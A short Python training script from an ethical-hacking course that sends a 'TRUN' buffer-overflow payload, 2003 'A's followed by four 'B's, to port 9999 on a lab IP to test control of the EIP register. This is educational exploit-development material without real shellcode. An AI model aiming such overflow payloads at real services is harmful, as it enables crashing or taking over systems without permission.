#!/usr/bin/python3
# Script:                       EIPoverwrite.py
# Author:                       Zachary Derrick (TCM: Practical Ethical Hacking)
# Date of latest revision:      2023.12.22
# Purpose:                     	This script is designed to test for a buffer overflow vulnerability
#  							   	by crafting a payload that intentionally overflows a buffer with 
# 								a series of 'A' characters, followed by 4 'B' characters. 
# 								This specific pattern is attempting to overwrite the Extended 
# 								Instruction Pointer (EIP) register. The script then establishes
#  								a connection to a target server on port 9999, sending the crafted
#  								payload using the TRUN command to assess the vulnerability and potential
#  								control over the EIP register. In the event of an exception during execution, 
# 								it prints an error message and exits the script.

import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.0.2.40', 9999))
	payload = 'TRUN /:./' + shellcode
	s.send((payload.encode()))
	s.close()
	
	
except Exception as e:
	print(f"Error: {e}")
	sys.exit()
			
